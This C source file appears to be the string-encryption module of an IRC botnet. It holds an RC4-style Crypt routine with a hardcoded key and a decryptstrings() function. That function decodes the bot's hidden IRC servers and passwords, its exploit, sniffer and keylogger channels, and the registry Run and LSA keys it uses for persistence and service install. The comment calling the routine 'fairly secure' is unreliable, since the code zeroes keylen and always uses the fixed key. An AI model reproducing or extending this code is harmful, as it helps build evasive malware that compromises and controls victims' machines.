#include "includes.h"
#include "functions.h"

// this is a nice all-in-one solution to encrypt/decrypt and it's fairly secure
// recommended even for novice users.
void Crypt(unsigned char *inp, DWORD inplen, unsigned char *key, DWORD keylen)
{
	//we will consider size of sbox 256 bytes
	//(extra byte are only to prevent any mishep just in case)
	unsigned char Sbox[257], Sbox2[257], temp = 0 , k = 0;
	unsigned long i=0, j=0, t=0, x=0;

	keylen = 0;

	//this unsecured key is to be used only when there is no input key from user
	unsigned char OurUnSecuredKey[49]; // CHANGE THIS!!!!!
	OurUnSecuredKey[0]=10; OurUnSecuredKey[1]=14; OurUnSecuredKey[2]=32; OurUnSecuredKey[3]=72;
	OurUnSecuredKey[4]=11; OurUnSecuredKey[5]=43; OurUnSecuredKey[6]=12; OurUnSecuredKey[7]=35;
	OurUnSecuredKey[8]=58; OurUnSecuredKey[9]=39; OurUnSecuredKey[10]=40; OurUnSecuredKey[11]=94;
	OurUnSecuredKey[12]=42; OurUnSecuredKey[13]=30; OurUnSecuredKey[14]=45; OurUnSecuredKey[15]=90;
	OurUnSecuredKey[16]=27; OurUnSecuredKey[17]=15; OurUnSecuredKey[18]=76; OurUnSecuredKey[19]=68;
	OurUnSecuredKey[20]=22; OurUnSecuredKey[21]=04; OurUnSecuredKey[22]=87; OurUnSecuredKey[23]=35;
	OurUnSecuredKey[24]=17; OurUnSecuredKey[25]=83; OurUnSecuredKey[26]=56; OurUnSecuredKey[27]=19;
	OurUnSecuredKey[28]=13; OurUnSecuredKey[29]=18; OurUnSecuredKey[30]=37; OurUnSecuredKey[31]=28;
	OurUnSecuredKey[32]=48; OurUnSecuredKey[33]=18; OurUnSecuredKey[34]=80; OurUnSecuredKey[35]=79;
	OurUnSecuredKey[36]=57; OurUnSecuredKey[37]=16; OurUnSecuredKey[38]=66; OurUnSecuredKey[39]=31;
	OurUnSecuredKey[40]=55; OurUnSecuredKey[41]=29; OurUnSecuredKey[42]=65; OurUnSecuredKey[43]=85;
	OurUnSecuredKey[44]=44; OurUnSecuredKey[45]=65; OurUnSecuredKey[46]=44; OurUnSecuredKey[47]=88;
	OurUnSecuredKey[48]=0;
	//static const int OurKeyLen = _tcslen(OurUnSecuredKey);    
	unsigned int OurKeyLen = strlen((char *)OurUnSecuredKey);  

    //always initialize the arrays with zero
	ZeroMemory(Sbox, sizeof(Sbox));
	ZeroMemory(Sbox2, sizeof(Sbox2));

    //initialize sbox i
	for(i = 0; i < 256U; i++)
		Sbox[i] = (unsigned char)i;

    //whether user has sent any input key
	if(keylen) {
		//initialize the sbox2 with user key
		for(i = 0; i < 256U ; i++) {
			if(j == keylen)
				j = 0;
			Sbox2[i] = key[j++];
		}    
	} else {
		//initialize the sbox2 with our key
		for(i = 0; i < 256U ; i++) {
			if(j == (unsigned long)OurKeyLen)
				j = 0;
			Sbox2[i] = OurUnSecuredKey[j++];
		}
	}

	j = 0 ; //Initialize j
	//scramble sbox1 with sbox2
	for(i = 0; i < 256; i++) {
		j = (j + (unsigned long) Sbox[i] + (unsigned long) Sbox2[i]) % 256U ;
		temp =  Sbox[i];                    
		Sbox[i] = Sbox[j];
		Sbox[j] =  temp;
	}

	i = j = 0;
	for(x = 0; x < inplen; x++) {
		//increment i
		i = (i + 1U) % 256U;
		//increment j
		j = (j + (unsigned long) Sbox[i]) % 256U;

		//Scramble SBox #1 further so encryption routine will
		//will repeat itself at great interval
		temp = Sbox[i];
		Sbox[i] = Sbox[j] ;
		Sbox[j] = temp;

		//Get ready to create pseudo random  byte for encryption key
		t = ((unsigned long) Sbox[i] + (unsigned long) Sbox[j]) %  256U ;

		//get the random byte
		k = Sbox[t];

		//xor with the data and done
		inp[x] = (unsigned char)(inp[x] ^ k);
	}

#ifdef _DEBUG
	printf("crypt: %s\n",inp);
#endif
	return;
}

void Encrypt2(char *str)
{
	for(int i=0; i<strlen(str);i++)
	{
		str[i]^=215;
	}
}
#ifndef NO_FTPIP
//Crypt((unsigned char *)ftpip,strlen(ftpip),NULL,0);
#endif
#ifndef NO_CRYPT
extern char cononstart[];
void decryptstrings(int authsize, int versionsize, int serversize)
{
	int i;

//	Crypt((unsigned char *)movepath,strlen(movepath),NULL,0); // the % fucks up the crypt
	Crypt((unsigned char *)filename,strlen(filename),NULL,0);

#ifndef NO_FCONNECT
	Crypt((unsigned char *)cononstart,strlen(cononstart),NULL,0);
#endif

	Crypt((unsigned char *)version,strlen(version),NULL,0);

#ifndef NO_SERVICE
	Crypt((unsigned char *)servicename,strlen(servicename),NULL,0);
	Crypt((unsigned char *)servicedisplayname,strlen(servicedisplayname),NULL,0);
	Crypt((unsigned char *)servicedesc,strlen(servicedesc),NULL,0);
#else
	Crypt((unsigned char *)runkey.subkey,strlen(runkey.subkey),NULL,0);
	Crypt((unsigned char *)runkey.name,strlen(runkey.name),NULL,0);
#endif

	Crypt((unsigned char *)password,strlen(password),NULL,0);
	
	for(i=0;i < authsize;i++)
		Crypt((unsigned char *)authost[i],strlen(authost[i]),NULL,0);

#ifndef NO_VERSION_REPLY
	for(i=0;i < versionsize;i++)
		Crypt((unsigned char *)versionlist[i],strlen(versionlist[i]),NULL,0);
#endif

	for(i=0;i < serversize;i++)
	{
		Crypt((unsigned char *)servers[i].host,strlen(servers[i].host),NULL,0);
		Crypt((unsigned char *)servers[i].pass,strlen(servers[i].pass),NULL,0);
		Crypt((unsigned char *)servers[i].chan,strlen(servers[i].chan),NULL,0);
		Crypt((unsigned char *)servers[i].chanpass,strlen(servers[i].chanpass),NULL,0);
		Crypt((unsigned char *)servers[i].modeonconn,strlen(servers[i].modeonconn),NULL,0);
		Crypt((unsigned char *)servers[i].modeonjoin,strlen(servers[i].modeonjoin),NULL,0);
		Crypt((unsigned char *)servers[i].exploitchan,strlen(servers[i].exploitchan),NULL,0);
		Crypt((unsigned char *)servers[i].sniffchan,strlen(servers[i].sniffchan),NULL,0);
		Crypt((unsigned char *)servers[i].warningchan,strlen(servers[i].warningchan),NULL,0);
	}

#ifndef NO_MELT
	Crypt((unsigned char *)meltkey.subkey,strlen(meltkey.subkey),NULL,0);
	Crypt((unsigned char *)meltkey.name,strlen(meltkey.name),NULL,0);
#endif
#ifndef NO_RECORD_UPTIME
	Crypt((unsigned char *)rupkey.subkey,strlen(rupkey.subkey),NULL,0);
	Crypt((unsigned char *)rupkey.name,strlen(rupkey.name),NULL,0);
#endif
#ifndef NO_INSTALLED_TIME
	Crypt((unsigned char *)itkey.subkey,strlen(itkey.subkey),NULL,0);
	Crypt((unsigned char *)itkey.name,strlen(itkey.name),NULL,0);
#endif

	/*Crypt((unsigned char *)botid,strlen(botid),NULL,0);
	Crypt((unsigned char *)version,strlen(version),NULL,0);
	Crypt((unsigned char *)server,strlen(server),NULL,0);
	Crypt((unsigned char *)serverpass,strlen(serverpass),NULL,0);
	Crypt((unsigned char *)channel,strlen(channel),NULL,0);
	Crypt((unsigned char *)chanpass,strlen(chanpass),NULL,0);
	Crypt((unsigned char *)server2,strlen(server2),NULL,0);
	Crypt((unsigned char *)channel2,strlen(channel2),NULL,0);
	Crypt((unsigned char *)chanpass2,strlen(chanpass2),NULL,0);
	Crypt((unsigned char *)filename,strlen(filename),NULL,0);
	Crypt((unsigned char *)keylogfile,strlen(keylogfile),NULL,0);
	Crypt((unsigned char *)valuename,strlen(valuename),NULL,0);
	Crypt((unsigned char *)nickconst,strlen(nickconst),NULL,0);
	Crypt((unsigned char *)modeonconn,strlen(modeonconn),NULL,0);
	Crypt((unsigned char *)chanmode,strlen(chanmode),NULL,0);
	Crypt((unsigned char *)exploitchan,strlen(exploitchan),NULL,0);
	Crypt((unsigned char *)keylogchan,strlen(keylogchan),NULL,0);
	Crypt((unsigned char *)psniffchan,strlen(psniffchan),NULL,0);

	for(i=0;i < authsize;i++)
		Crypt((unsigned char *)authost[i],strlen(authost[i]),NULL,0);

	for(i=0;i < versionsize;i++)
		Crypt((unsigned char *)versionlist[i],strlen(versionlist[i]),NULL,0);

	Crypt((unsigned char *)regkey1,strlen(regkey1),NULL,0); // "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
	Crypt((unsigned char *)regkey2,strlen(regkey2),NULL,0); // "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices"
	Crypt((unsigned char *)regkey3,strlen(regkey3),NULL,0); // "Software\\Microsoft\\OLE"
	Crypt((unsigned char *)regkey4,strlen(regkey4),NULL,0); // "SYSTEM\\CurrentControlSet\\Contol\\Lsa"*/

	return;
};
#endif
